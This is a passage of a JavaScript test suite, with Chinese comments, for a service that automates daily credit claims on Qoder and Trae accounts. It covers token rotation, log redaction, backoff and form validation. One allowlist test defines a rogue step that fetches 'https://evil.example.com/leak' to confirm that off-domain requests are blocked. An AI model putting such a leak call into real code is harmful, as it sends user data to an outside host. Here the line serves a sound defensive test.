    "GET /sash/api/v1/me/campaigns": (rec, n) => (n === 1
      ? { status: 401, body: "unauthorized" }
      : { payload: { campaigns: claimable(1) } }),
    "POST /api/v1/deviceToken/refresh": () => {
      refreshed += 1;
      return { payload: { token: mkJwt({ sub: uid, exp: cst(60) }), refreshToken: "rt-ROTATED-999" } };
    },
    "POST /sash/api/v1/me/campaigns/cmp-0/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 20 } } } },
  });
  try {
    const { summary } = await qoderTick(kv);
    assert.equal(refreshed, 1);
    assert.equal(planOf(summary, "qoder").accounts[0].status, "claimed", "续期成功后应正常领到");
    const cred = JSON.parse(kv.store.get(`v1:acct:qoder:${uid}`)).cred;
    assert.equal(cred.refreshToken, "rt-ROTATED-999", "轮换出来的新 refresh_token 没写回，下一轮拿旧串必然失败");
    assert.match(cred.accessToken, /^eyJ/);
    assert.ok(Number(cred.expiresAt) > 0, "到期时间应随续期一起落盘");
    const log = kv.store.get([...kv.store.keys()].find((k) => k.startsWith("v1:run:qoder:")));
    assert.ok(!log.includes("rt-ROTATED-999") && !log.includes("rt-old"), "新旧任一张 refresh_token 都不许进日志");
  } finally { stub.restore(); }
});

test("[qoder] 续期也救不回来才是 login_required，且不再发 claim", async () => {
  const kv = fakeKv();
  seedQoder(kv);
  const stub = stubUpstream({
    "GET /sash/api/v1/me/campaigns": { status: 403, body: "forbidden" },
    "POST /api/v1/deviceToken/refresh": { status: 403, body: "refresh revoked" },
  });
  try {
    const { summary } = await qoderTick(kv);
    assert.equal(planOf(summary, "qoder").accounts[0].status, "login_required");
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/claim")).length, 0, "认证已失败还去打 claim 是白烧配额");
  } finally { stub.restore(); }
});

test("[qoder] 403 不再被当成「这个端点不对」吞掉", async () => {
  const kv = fakeKv();
  seedQoder(kv);
  // 旧实现把 401/403/404 都当作"换下一个 base 重试"，单 host 下就变成没有出口的循环，
  // 最后报成一条看不出所以然的错误
  const stub = stubUpstream({ "GET /sash/api/v1/me/campaigns": { status: 404, body: "not found" } });
  try {
    const { summary } = await qoderTick(kv);
    const view = planOf(summary, "qoder").accounts[0];
    assert.notEqual(view.status, "claimed");
    assert.match(view.message, /HTTP 404|结构异常/);
    assert.equal(stub.seen.length, 1, "一条失败响应不该被重试成多次请求");
  } finally { stub.restore(); }
});

test("[qoder] 一轮最多领 3 个，剩下的标记可接续、不被 30 分钟间隔挡住", async () => {
  const kv = fakeKv();
  seedQoder(kv);
  const five = claimable(5);
  const stub = stubUpstream({
    "GET /sash/api/v1/me/campaigns": { payload: { campaigns: five } },
    "POST /sash/api/v1/me/campaigns/cmp-0/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 20 } } } },
    "POST /sash/api/v1/me/campaigns/cmp-1/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 20 } } } },
    "POST /sash/api/v1/me/campaigns/cmp-2/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 20 } } } },
    "POST /sash/api/v1/me/campaigns/cmp-3/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 20 } } } },
    "POST /sash/api/v1/me/campaigns/cmp-4/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 20 } } } },
  });
  try {
    const now = cst(11);
    const first = await qoderTick(kv, now);
    const view = planOf(first.summary, "qoder").accounts[0];
    assert.equal(view.status, "partial");
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/claim")).length, 3, "自设上界失效，一轮领超了");
    assert.match(view.message, /还有 2 个待领/);
    assert.equal(schedEntryOf(kv, "qoder", "qdr-77001").resumable, true, "没做完的轮次必须可接续");
    kv.calls.length = 0;
    kv.advanceTo((now + 60) * 1000);            // 只过 1 分钟：远小于 minIntervalSec
    const lock = [...kv.store.keys()].find((k) => k.startsWith("v1:lock:qoder:"));
    if (lock) kv.store.delete(lock);            // 只让锁失效，间隔仍按调度判定
    const second = await qoderTick(kv, now + 60);
    assert.equal(planOf(second.summary, "qoder").accounts.length, 1, "可接续的账号下一轮该接着领");
  } finally { stub.restore(); }
});

test("[qoder] uid 从 access token 的 sub 里解出来，人不用抄第二遍", async () => {
  const kv = fakeKv();
  kv.store.set("v1:tool:qoder", JSON.stringify({ clientType: "10", machineToken: "MT", machineCode: "MC", machineId: "MI" }));
  const token = mkJwt({ sub: "qdr-sub-42", exp: cst(30) });
  const res = await hit("/account/qoder/new", {
    method: "POST", env: envFor(kv),
    body: form({ pwd: PASSWORD, label: "抄来的号", accessToken: token, refreshToken: "rt-x" }),
  });
  assert.equal(res.status, 303, res.text.slice(0, 200));
  assert.ok(kv.store.has("v1:acct:qoder:qdr-sub-42"), "uid 应是 JWT 的 sub");
});

test("[qoder] 解不出 sub 就拒存，且绝不退化成用 refresh_token 派生", async () => {
  const kv = fakeKv();
  kv.store.set("v1:tool:qoder", JSON.stringify({ clientType: "10", machineToken: "MT", machineCode: "MC", machineId: "MI" }));
  const res = await hit("/account/qoder/new", {
    method: "POST", env: envFor(kv),
    body: form({ pwd: PASSWORD, label: "坏票据", accessToken: "not-a-jwt", refreshToken: "rt-y" }),
  });
  assert.equal(res.status, 400);
  assert.match(res.text, /账号标识/);
  assert.deepEqual([...kv.store.keys()].filter((k) => k.startsWith("v1:acct:")), [], "存了账号就等于允许多个键指向同一个人");
  // 新版客户端把 access token 换成了设备令牌（不透明串），解不出 sub 时要求手填代号；
  // 但绝不退化成用 refresh_token 派生 —— 旧实现这么干，refresh_token 一轮换个 uid，
  // 旧记录（连同调度状态与日志）在 KV 里成孤儿
});

test("[qoder] 设备令牌形态：手填的固定代号当账号标识，JWT 形态照旧解 sub", async () => {
  const kv = fakeKv();
  kv.store.set("v1:tool:qoder", JSON.stringify({ clientType: "10", machineToken: "MT", machineCode: "MC", machineId: "MI" }));
  // 设备令牌（dt-- 开头的不透明串）+ 手填代号 → 建号，键名就是代号
  const res = await hit("/account/qoder/new", {
    method: "POST", env: envFor(kv),
    body: form({ pwd: PASSWORD, label: "主号", accessToken: "dt--CLUPwA4x8FGSGpkCm2zp0hKA", uid: "main", refreshToken: "rt-y" }),
  });
  assert.equal(res.status, 303);
  const stored = JSON.parse(kv.store.get("v1:acct:qoder:main"));
  assert.equal(stored.cred.accessToken, "dt--CLUPwA4x8FGSGpkCm2zp0hKA");
  assert.equal(stored.cred.uid, "main", "代号要随凭据存下来，编辑重算时才拿得到");
  // JWT 形态（旧客户端）不受影响：sub 优先，手填栏留空也放行
  const kv2 = fakeKv();
  kv2.store.set("v1:tool:qoder", JSON.stringify({ clientType: "10", machineToken: "MT", machineCode: "MC", machineId: "MI" }));
  const res2 = await hit("/account/qoder/new", {
    method: "POST", env: envFor(kv2),
    body: form({ pwd: PASSWORD, label: "旧形态", accessToken: mkJwt({ sub: "qdr-77009", exp: cst(30) }), refreshToken: "rt-z" }),
  });
  assert.equal(res2.status, 303);
  assert.ok(kv2.store.has("v1:acct:qoder:qdr-77009"), "JWT 的 sub 仍然优先，不需要手填");
});

test("[qoder] 把另一个号的票据粘进已有账号会被拒", async () => {
  const kv = fakeKv();
  const { uid } = seedQoder(kv);
  const otherToken = mkJwt({ sub: "qdr-OTHER", exp: cst(30) });
  const res = await hit(`/account/qoder/${uid}/edit`, {
    method: "POST", env: envFor(kv),
    body: form({ pwd: PASSWORD, label: "还是原来的名字", accessToken: otherToken, refreshToken: "rt-z", plan: "" }),
  });
  assert.equal(res.status, 409);
  assert.match(res.text, /qdr-OTHER/);
  assert.equal(JSON.parse(kv.store.get(`v1:acct:qoder:${uid}`)).cred.accessToken.split(".")[1], mkJwt({ sub: uid, exp: cst(30) }).split(".")[1], "凭据不该被改掉");
});

test("[qoder] 令牌到期时间在界面上按北京时间显示，且表单不收它", async () => {
  const kv = fakeKv();
  seedQoder(kv);
  const page = await authed("/account/qoder/qdr-77001/edit", envFor(kv));
  assert.ok(page.text.includes("只读"), "派生字段要标成只读");
  assert.ok(!/<input[^>]*name="expiresAt"/.test(page.text), "expiresAt 不该是可提交的输入框");
  const forged = await hit("/account/qoder/qdr-77001/edit", {
    method: "POST", env: envFor(kv),
    body: form({ pwd: PASSWORD, label: "伪报", accessToken: "", refreshToken: "", expiresAt: "253402300800" }),
  });
  assert.equal(forged.status, 303);
  assert.ok(!JSON.parse(kv.store.get("v1:acct:qoder:qdr-77001")).cred.expiresAt, "表单提交的 expiresAt 必须被丢掉");
});

test("[qoder] 白名单：模块想打到别的域名会被内核直接拒掉", async () => {
  const kv = fakeKv();
  seedQoder(kv);
  const stub = stubUpstream({ "GET /sash/api/v1/me/campaigns": { payload: { campaigns: [] } } });
  try {
    const tool = { ...findTool("qoder") };
    tool.steps = [{ id: "rogue", label: "越界", cost: 1, async run(ctx) { return await ctx.fetch("https://evil.example.com/leak", {}).then((r) => r.text()).then((t) => ({ status: "ok", message: t })); } }];
    const budget = makeBudget(45);
    const { summary } = await tickWith(kv, [tool], 45, cst(11));
    const view = planOf(summary, "qoder").accounts[0];
    assert.equal(view.status, "error");
    assert.match(view.message, /禁止的请求域名/);
    assert.equal(stub.seen.filter((r) => r.host !== QODER_HOST).length, 0);
  } finally { stub.restore(); }
});

test("[qoder] 一轮一号的真实用量不超过预约（TOOL_FRAME + 步骤 cost）", async () => {
  const kv = fakeKv();
  seedQoder(kv);
  const stub = stubUpstream({
    "GET /sash/api/v1/me/campaigns": { payload: { campaigns: claimable(3) } },
    "POST /sash/api/v1/me/campaigns/cmp-0/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 20 } } } },
    "POST /sash/api/v1/me/campaigns/cmp-1/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 20 } } } },
    "POST /sash/api/v1/me/campaigns/cmp-2/claim": { payload: { data: { status: "CLAIMED", benefit: { amount: 20 } } } },
  });
  try {
    const stepCost = findTool("qoder").steps[0].cost;
    const { budget } = await qoderTick(kv);
    assert.ok(budget.used <= TOOL_FRAME + ACCOUNT_FRAME + stepCost, `真实 ${budget.used} 超过预约 ${TOOL_FRAME + ACCOUNT_FRAME + stepCost}`);
    assert.equal(budget.over, 0);
  } finally { stub.restore(); }
});

// 调度索引按工具分键，取条目的 helper 也要跟着分工具
function schedEntryOf(kv, toolId, uid) {
  const raw = kv.store.get(`v1:schedidx:${toolId}`);
  return raw ? schedOf(JSON.parse(raw).entries[uid]) : schedOf();
}

test("[含 + 与 = 的令牌粘进表单不会被解码成空格", async () => {
  // 旧 trae 专门绕开 URLSearchParams 解 query，理由写得很清楚：标准表单解码会把字面 +
  // 变成空格，refresh_token 一旦被改坏，账号就静默认证失败，而且看不出是编码问题。
  // 浏览器提交 urlencoded 表单会把 + 编成 %2B，服务端解回来应当原样不变 —— 这条是回归守卫。
  const kv = fakeKv(); const env = envFor(kv);
  const tricky = "rt-A1b2C3+D4e5F6/g.h=i=j==";
  const token = mkJwt({ sub: "plus-user", exp: cst(30) });
  const res = await hit("/account/qoder/new", {
    method: "POST", env,
    body: form({ pwd: PASSWORD, label: "带加号", accessToken: token, refreshToken: tricky }),
  });
  assert.equal(res.status, 303);
  const saved = JSON.parse(kv.store.get("v1:acct:qoder:plus-user")).cred;
  assert.equal(saved.refreshToken, tricky, "refresh_token 里的 + 被解码成了空格");
  assert.ok(!saved.refreshToken.includes(" "), "凭据里不该出现空格");
});

test("[只读派生字段不收表单值，界面上按北京时间显示", async () => {
  const kv = fakeKv();
  seedQoder(kv, "ro-user");
  kv.store.set("v1:acct:qoder:ro-user", JSON.stringify({
    label: "已续期", cred: { accessToken: mkJwt({ sub: "ro-user", exp: cst(30) }), refreshToken: "rt-x", expiresAt: String(cst(30)) },
    createdAt: 1, updatedAt: 1,
  }));
  const page = await authed("/tool/qoder", envFor(kv));
  assert.ok(/\d{4}-\d{2}-\d{2} \d{2}:\d{2}/.test(page.text), "到期时间该显示成可读的北京时间，而不是一串 epoch");
  const forged = await hit("/account/qoder/ro-user/edit", {
    method: "POST", env: envFor(kv),
    body: form({ pwd: PASSWORD, label: "伪报永久", accessToken: "", refreshToken: "", expiresAt: "253402300800" }),
  });
  assert.equal(forged.status, 303);
  assert.equal(JSON.parse(kv.store.get("v1:acct:qoder:ro-user")).cred.expiresAt, String(cst(30)), "表单里的伪报值不该覆盖内核记的到期时间");
});

test("[某个工具的表单里不该出现别的工具的字段名", async () => {
  // 「加第 N 个工具不用改界面」这条承诺最容易被破的方式，就是有人往共享的渲染代码里
  // 写死一句具体工具的字段名。这条测试把那种做法直接判红。
  const env = envFor(fakeKv());
  for (const tool of TOOLS) {
    const page = await authed(`/account/new?tool=${tool.id}`, env);
      assert.equal(page.status, 200);
    const own = new Set([...(tool.creds || []), ...(tool.config || [])].map((f) => f.label));
    for (const other of TOOLS.filter((t) => t.id !== tool.id)) {
      for (const field of [...(other.creds || []), ...(other.config || [])]) {
        // 两家碰巧都叫「Access Token」不算串味，只查那些独属于别家工具的字段名
        if (own.has(field.label)) continue;
        assert.ok(!page.text.includes(field.label), `${tool.name} 的表单里出现了 ${other.name} 的字段名「${field.label}」—— 共享渲染代码被写死了`);
      }
    }
  }
});

test("[qoder] 逻辑日按上游的活动窗口在 10:00 翻，而不是按北京零点", async () => {
  // 内核每轮算一次 day 注入 ctx.day，"今天已领"的上闩与当日次数都挂在它上面。
  // 这家的活动按 UTC+8 每天 10:00 前后重新下发，所以零点翻只会让 00:00–10:00 那段
  // 被当成"新的一天"，白换一个预算与进度。
  const qoder = findTool("qoder");
  assert.equal(qoder.schedule.resetHour, 10);
  assert.equal(dayOf(qoder, cst(9, 30)), logicalDay(10, cst(9, 30)));
  assert.notEqual(dayOf(qoder, cst(10, 30)), dayOf(qoder, cst(9, 30)), "10:00 两侧该属于两个逻辑日");
  assert.equal(dayOf(qoder, cst(23, 0)), dayOf(qoder, cst(10, 30)), "同一个窗口内不该被切成两天");
});

test("[schedule] resetHour 填错的后果：日界决定「今天已领」的上闩", () => {
  // resetHour 不是"看起来合理就行"的数字，它直接决定 lastStatusDate 与哪一天
  // 比对 —— 填错会让"今天已领"这道上闩比对错日子，于是重复领取或整天空跑。
  // 这一条把三家的实际取值与填错的后果都钉住，换工具时照着填。
  const tool = (resetHour, notBeforeHour) => ({
    schedule: { resetHour, notBeforeHour, minIntervalSec: 1800, maxDaily: 20, backoff: [] },
  });
  // 场景要落在 notBeforeHour 之后 —— 否则第一道闸就挡跑了，测不到日界判定。
  // 北京 08:00，账号当天 07:00 已签到成功。
  const now = cst(8, 0);
  const signedDay = cstDate(now);
  const entry = { lastStatus: "claimed", lastStatusDate: signedDay, lastAt: now - 3600, attempts: 1, attemptsDate: signedDay };

  // 正确：Trae/WorkBuddy 的 0 —— 逻辑日就是北京日期，与 lastStatusDate 相同 → 已结清
  assert.equal(isDue(tool(0, 8), entry, dayOf(tool(0, 8), now), now), false,
    "resetHour=0 且当天已签到过，不该重新到期");
  // 填错：把 0 写成 10 —— 逻辑日退回前一天，与 lastStatusDate 比不上 → 当场重复领取
  assert.equal(isDue(tool(10, 8), entry, dayOf(tool(10, 8), now), now), true,
    "resetHour 填成 10 会让当天早上那轮重新到期（这就是它不能瞎填的原因）");

  // 三家的实际取值：Qoder 跟着上游活动窗口，另两家跟北京零点
  assert.equal(findTool("qoder").schedule.resetHour, 10, "Qoder 的日界是 10 点");
  assert.equal(findTool("trae").schedule.resetHour, 0, "Trae 的日界是 0 点");
  assert.equal(findTool("workbuddy").schedule.resetHour, 0, "WorkBuddy 的日界是 0 点");
  // 日界与"最早几点跑"是两个旋钮，不能互相顶替：
  // Qoder 的 notBeforeHour 必须不早于 resetHour，否则 10 点前会白打并烧掉 pending 机会
  assert.ok(findTool("qoder").schedule.notBeforeHour >= findTool("qoder").schedule.resetHour,
    "Qoder 的 notBeforeHour 不该早于 resetHour");
  assert.equal(findTool("qoder").schedule.notBeforeHour, 10, "Qoder 10 点之前打只是白烧子请求");
  assert.equal(findTool("trae").schedule.notBeforeHour, 0, "Trae 零点第一轮就跑");
  assert.equal(findTool("workbuddy").schedule.notBeforeHour, 0, "WorkBuddy 零点第一轮就跑");
});

// ═══════════ Trae ═══════════
//
// Trae 的方言比 Qoder 更刁：两家域名、两套鉴权头、业务码藏在中文 message 里、
// 空 body 的 200 既可能是"已签到"也可能是"响应结构异常"。
// 旧代码在注释里记着三条踩过的坑，这里逐条钉成断言。

const TRAE_OAUTH = "api.trae.com.cn";
const TRAE_CLAIM = "api.trae.cn";

function seedTrae(kv, uid = "991001", { exp = cst(60), device = "1234567890123456", expiresAt } = {}) {
  kv.store.set("v1:tool:trae", JSON.stringify({ clientId: "cid-test", appVersion: "0.1.43" }));
  kv.store.set(`v1:acct:trae:${uid}`, JSON.stringify({
    label: `T 主号-${uid}`,
    cred: {
      accessToken: mkJwt({ sub: "ignored-by-trae", exp }),
      refreshToken: "rt-trae-old-AAAAAAAA",
      ahaDeviceId: device,
      ...(expiresAt === undefined ? { expiresAt: String(cst(40)) } : { expiresAt: String(expiresAt) }),
    },
    createdAt: 1, updatedAt: 1,
  }));
  kv.store.set("v1:schedidx:trae", JSON.stringify({ day: null, entries: {} }));
  return uid;
}

const traeTick = (kv, now = cst(10)) => tickWith(kv, [findTool("trae")], 45, now);
const statusOf = (checked, credits) => ({ payload: { checked_in: checked, credits, enable: true } });

test("[trae] 两个域名的鉴权头不共用：换票/用户信息用 x-cloudide-token，签到用 Cloud-IDE-JWT + x-device-id", async () => {
  const kv = fakeKv();
  const uid = seedTrae(kv);
  const stub = stubUpstream({
    "POST /trae/api/v2/ug/checkin_credits/status": statusOf(false, 0),
    "POST /trae/api/v2/ug/checkin_credits/claim": { payload: { code: 0, message: "success", credits: 100 } },
    "POST /trae/api/v2/pay/ide_user_ent_usage": { payload: { user_entitlement_pack_list: [{ entitlement_base_info: { quota: { credits_limit: 500, credits_amount: 120 } } }] } },
  });
  try {
    await traeTick(kv);
    const status = stub.seen.find((r) => r.path.endsWith("/status"));
    const info = stub.seen.find((r) => r.path.endsWith("GetUserInfo"));
    assert.equal(status.host, TRAE_CLAIM);
    assert.match(status.headers.Authorization, /^Cloud-IDE-JWT eyJ/);
    assert.equal(status.headers["x-device-id"], "1234567890123456");
    assert.equal(status.headers["X-User-Region"], "CN");
    assert.equal(status.headers["x-cloudide-token"], undefined, "签到侧不该带用户信息的鉴权头");
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/claim")).length, 1);
    assert.equal(uid, "991001");
  } finally { stub.restore(); }
});

test("[trae] HTTP 200 + 空 body 不能被判成签到成功", async () => {
  const kv = fakeKv();
  seedTrae(kv);
  const stub = stubUpstream({
    "POST /trae/api/v2/ug/checkin_credits/status": { payload: {} },
    // 空 body：code 缺失。旧写法 `code || 0` 会把它当成 code=0 = 成功，
    // 于是当天上闩、退避暂停还被顺手清空
    "POST /trae/api/v2/ug/checkin_credits/claim": { body: "", status: 200 },
    "POST /trae/api/v2/pay/ide_user_ent_usage": { payload: { user_entitlement_pack_list: [] } },
  });
  try {
    const { summary } = await traeTick(kv);
    const view = planOf(summary, "trae").accounts[0];
    assert.equal(view.status, "error", "空响应被当成成功");
    assert.match(view.message, /结构异常/);
  } finally { stub.restore(); }
});

test("[trae] 「请求已过期」「账号已在其他设备登录」不许被当成今日已签", async () => {
  // 旧实现用裸 msg.includes("已") 判"已签到"，把这两种完全不同的故障都报成成功
  for (const msg of ["请求已过期", "账号已在其他设备登录"]) {
    const kv = fakeKv();
    seedTrae(kv);
    const stub = stubUpstream({
      "POST /trae/api/v2/ug/checkin_credits/status": statusOf(false, 0),
      "POST /trae/api/v2/ug/checkin_credits/claim": { payload: { code: 40012, message: msg } },
      "POST /trae/api/v2/pay/ide_user_ent_usage": { payload: { user_entitlement_pack_list: [] } },
    });
    try {
      const { summary } = await traeTick(kv);
      const view = planOf(summary, "trae").accounts[0];
      assert.notEqual(view.status, "already", `「${msg}」被收窄前的正则误判成已签到`);
      assert.notEqual(view.status, "claimed");
      assert.equal(view.status, "error");
    } finally { stub.restore(); }
  }
});

test("[trae] 「今天已签到」这类说法要判成 already", async () => {
  const kv = fakeKv();
  seedTrae(kv);
  const stub = stubUpstream({
    "POST /trae/api/v2/ug/checkin_credits/status": statusOf(false, 0),
    "POST /trae/api/v2/ug/checkin_credits/claim": { payload: { code: 40001, message: "今天已签到，请明天再来" } },
    "POST /trae/api/v2/pay/ide_user_ent_usage": { payload: { user_entitlement_pack_list: [] } },
  });
  try {
    const { summary } = await traeTick(kv);
    assert.equal(planOf(summary, "trae").accounts[0].status, "already");
  } finally { stub.restore(); }
});

test("[trae] 9074 走退避阶梯，且退避期内不排队", async () => {
  const kv = fakeKv();
  seedTrae(kv);
  const busy = {
    "POST /trae/api/v2/ug/checkin_credits/status": statusOf(false, 0),
    "POST /trae/api/v2/ug/checkin_credits/claim": { payload: { code: 9074, message: "当前参与用户太多" } },
    "POST /trae/api/v2/pay/ide_user_ent_usage": { payload: { user_entitlement_pack_list: [] } },
  };
  const stub = stubUpstream(busy);
  try {
    const now = cst(10);
    const first = planOf((await traeTick(kv, now)).summary, "trae").accounts[0];
    assert.equal(first.status, "rate_limited");
    const entry = schedEntryOf(kv, "trae", "991001");
    assert.equal(entry.rateStrikes, 1);
    assert.equal(entry.retryAt, now + 30 * 60, "第一档 30 分钟");
    assert.equal((await traeTick(kv, now + 10 * 60)).summary.ran, 0, "退避期内不该排队");
    await traeTick(kv, now + 31 * 60);
    assert.equal(schedEntryOf(kv, "trae", "991001").rateStrikes, 2, "第二档该更长了");
    assert.equal(schedEntryOf(kv, "trae", "991001").retryAt - (now + 31 * 60), 60 * 60);
  } finally { stub.restore(); }
});

test("[trae] enable=false 是「活动未开」，不是今日已领也不是失败", async () => {
  const kv = fakeKv();
  seedTrae(kv);
  const stub = stubUpstream({ "POST /trae/api/v2/ug/checkin_credits/status": { payload: { checked_in: false, enable: false } } });
  try {
    const { summary } = await traeTick(kv);
    assert.equal(planOf(summary, "trae").accounts[0].status, "inactive");
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/claim")).length, 0);
  } finally { stub.restore(); }
});

test("[trae] checked_in=true 直接收手，一次 claim 都不发", async () => {
  const kv = fakeKv();
  seedTrae(kv);
  const stub = stubUpstream({
    "POST /trae/api/v2/ug/checkin_credits/status": statusOf(true, 380),
    "POST /trae/api/v2/ug/checkin_credits/claim": { payload: { code: 0, message: "不该被调用" } },
  });
  try {
    const { summary } = await traeTick(kv);
    const view = planOf(summary, "trae").accounts[0];
    assert.equal(view.status, "already");
    assert.match(view.message, /380/);
    assert.equal(stub.seen.filter((r) => r.path.endsWith("/claim")).length, 0);
  } finally { stub.restore(); }
});

test("[trae] 领取成功但没回积分时补读一次，界面上要看得见领到了多少", async () => {
  const kv = fakeKv();
  seedTrae(kv);
  let statusCalls = 0;
  const stub = stubUpstream({
    "POST /trae/api/v2/ug/checkin_credits/status": () => {
      statusCalls += 1;
      return { payload: { checked_in: false, credits: statusCalls === 1 ? 300 : 400, enable: true } };
    },
    "POST /trae/api/v2/ug/checkin_credits/claim": { payload: { code: 0, message: "success" } },
    "POST /trae/api/v2/pay/ide_user_ent_usage": { payload: { user_entitlement_pack_list: [{ entitlement_base_info: { quota: { credits_limit: 600, credits_amount: 400 } } }] } },
  });
  try {
    const { summary } = await traeTick(kv);
    const view = planOf(summary, "trae").accounts[0];
    assert.equal(view.status, "claimed");
    assert.equal(view.credits, 100, "积分该是补读前后的差值");
    assert.match(view.message, /剩余 200/);
  } finally { stub.restore(); }
});

test("[trae] 临近到期才换票；换出的新串当场写回，旧串不进日志", async () => {
  const kv = fakeKv();
  seedTrae(kv, "991002", { expiresAt: cst(10) + 3600 });   // 只剩 1 小时，落在 72 小时提前量里
  const stub = stubUpstream({
    "POST /cloudide/api/v3/trae/oauth/ExchangeToken": { payload: { Result: { Token: mkJwt({ sub: "x", exp: cst(120) }), RefreshToken: "rt-trae-ROTATED-zzz", TokenExpireAt: cst(120) * 1000 } } },
    "POST /trae/api/v2/ug/checkin_credits/status": statusOf(false, 0),
    "POST /trae/api/v2/ug/checkin_credits/claim": { payload: { code: 0, message: "success", credits: 50 } },
    "POST /trae/api/v2/pay/ide_user_ent_usage": { payload: { user_entitlement_pack_list: [] } },
  });
  try {
    await traeTick(kv);
    const cred = JSON.parse(kv.store.get("v1:acct:trae:991002")).cred;
    assert.equal(cred.refreshToken, "rt-trae-ROTATED-zzz");
    // TokenExpireAt 给的是毫秒，必须折算成秒存
    assert.equal(Number(cred.expiresAt), cst(120), "毫秒没折算，续期判断会永远认为已过期");
    const blob = logKeys(kv).map((k) => `${k}${kv.store.get(k)}${JSON.stringify(kv.metas.get(k) || {})}`).join("");
    assert.ok(!blob.includes("rt-trae-ROTATED-zzz") && !blob.includes("rt-trae-old"), "refresh_token 进了日志");
  } finally { stub.restore(); }
});

test("[trae] 票据还很新时不该白换票", async () => {
  const kv = fakeKv();
  seedTrae(kv, "991003", { expiresAt: cst(200) });      // 还剩 190 小时
  const stub = stubUpstream({
    "POST /trae/api/v2/ug/checkin_credits/status": statusOf(false, 0),
    "POST /trae/api/v2/ug/checkin_credits/claim": { payload: { code: 0, message: "success", credits: 10 } },
    "POST /trae/api/v2/pay/ide_user_ent_usage": { payload: { user_entitlement_pack_list: [] } },
  });
  try {
    await traeTick(kv);
    assert.equal(stub.seen.filter((r) => r.path.endsWith("ExchangeToken")).length, 0, "每天白换一次票既烧配额又像限频");
  } finally { stub.restore(); }
});

test("[trae] 点「测试」把票续了也要写回，否则一点测试就烧掉账号", async () => {
  const kv = fakeKv();
  seedTrae(kv, "991004", { expiresAt: cst(10) + 600 });
  const stub = stubUpstream({
    "POST /cloudide/api/v3/trae/oauth/ExchangeToken": { payload: { Result: { Token: mkJwt({ sub: "x", exp: cst(120) }), RefreshToken: "rt-from-validate", TokenExpireAt: cst(120) } } },
    "POST /trae/api/v2/ug/checkin_credits/status": statusOf(true, 100),
  });
  try {
    const res = await hit("/account/trae/991004/validate", { method: "POST", body: form({ pwd: PASSWORD }), env: envFor(kv) });
    assert.equal(res.status, 200);
    // 这条曾经"绿着漏掉"了一个 ReferenceError：换票成功 → 兜底把新串写回 → 页面照样出现
    // 「已换新凭据」，于是断言被那句副产物满足了，崩溃本身被当成成功。
    // 必须正面断言这次测试真的读到了状态。
    assert.match(res.text, /登录态有效/, `validate 没跑通：${res.text.slice(0, 300)}`);
    assert.doesNotMatch(res.text, /is not defined|ReferenceError/, "界面不该把崩溃当成结果");
    assert.equal(JSON.parse(kv.store.get("v1:acct:trae:991004")).cred.refreshToken, "rt-from-validate",
      "validate 期间换出的新串没落盘：旧串已被上游消耗，账号当场变砖");
    assert.match(res.text, /新凭据已写回/, "页面要说清楚这次动了凭据");
    assert.ok(!res.text.includes("rt-from-validate"), "新串不许出现在页面上");
  } finally { stub.restore(); }
});

test("[trae] uid 来自 GetUserInfo；取不到就拒存并说清原因", async () => {
  const kv = fakeKv();
  kv.store.set("v1:tool:trae", JSON.stringify({ clientId: "cid", appVersion: "0.1.43" }));
  const token = mkJwt({ sub: "not-the-uid", exp: cst(60) });
  const stub = stubUpstream({ "POST /cloudide/api/v3/trae/GetUserInfo": { payload: { Result: { UserID: 778899001, ScreenName: "小明" } } } });
  try {
    const ok = await hit("/account/trae/new", {
      method: "POST", env: envFor(kv),
      body: form({ pwd: PASSWORD, label: "trae 号", accessToken: token, refreshToken: "rt-1", ahaDeviceId: "1234567890123456" }),
    });
    assert.equal(ok.status, 303);
    assert.ok(kv.store.has("v1:acct:trae:778899001"), "uid 该是上游认的 UserID");
  } finally { stub.restore(); }

  const bad = stubUpstream({ "POST /cloudide/api/v3/trae/GetUserInfo": { status: 401, body: "expired" } });
  try {
    const res = await hit("/account/trae/new", {
      method: "POST", env: envFor(kv),
      body: form({ pwd: PASSWORD, label: "坏票", accessToken: token, refreshToken: "rt-2", ahaDeviceId: "1234567890123456" }),
    });
    assert.equal(res.status, 400);
    assert.match(res.text, /UserID|失效/);
    assert.ok(!kv.store.has("v1:acct:trae:undefined"), "取不到 uid 却存了个畸形键");
  } finally { bad.restore(); }
});

test("[trae] Aha 设备号在录入时就要求 8–16 位数字", async () => {
  // 旧实现运行时才校验 \d{8,16}，8 位值静默通过后每天撞 9074：
  // 一个立刻能说明白的错被变成了每周都难查一次的怪病。
  // 但也不能反过来收紧到 16 位 —— 手上现成的 8–15 位账号会被挡在录入之外，
  // 症状只是表单红字，与上游毫无关系，容易被误判成"平台坏了"。
  const kv = fakeKv();
  kv.store.set("v1:tool:trae", JSON.stringify({ clientId: "cid", appVersion: "0.1.43" }));
  let seq = 55;
  const stub = stubUpstream({ "POST /cloudide/api/v3/trae/GetUserInfo": () => ({ payload: { Result: { UserID: (seq += 1) } } }) });
  try {
    for (const bad of ["1234567", "12345678901234567", "abcdef1234567890", "12345678a"]) {
      const res = await hit("/account/trae/new", {
        method: "POST", env: envFor(kv),
        body: form({ pwd: PASSWORD, label: "设备号不对", accessToken: mkJwt({ exp: cst(60) }), refreshToken: "rt", ahaDeviceId: bad }),
      });
      assert.equal(res.status, 400, `${bad} 居然过了校验`);
      assert.match(res.text, /8–16 位/);
    }
    // 边界两侧都必须真的能录进去，否则"放宽"只是把校验删了
    for (const good of ["12345678", "1234567890123456"]) {
      const uid = seq + 1;
      const res = await hit("/account/trae/new", {
        method: "POST", env: envFor(kv),
        body: form({ pwd: PASSWORD, label: `设备号${good.length}位`, accessToken: mkJwt({ exp: cst(60) }), refreshToken: "rt", ahaDeviceId: good }),
      });
      assert.equal(res.status, 303, `${good}（${good.length} 位）被误拒了：${res.text.slice(0, 200)}`);
      assert.equal(JSON.parse(kv.store.get(`v1:acct:trae:${uid}`)).cred.ahaDeviceId, good);
      seq = uid;
    }
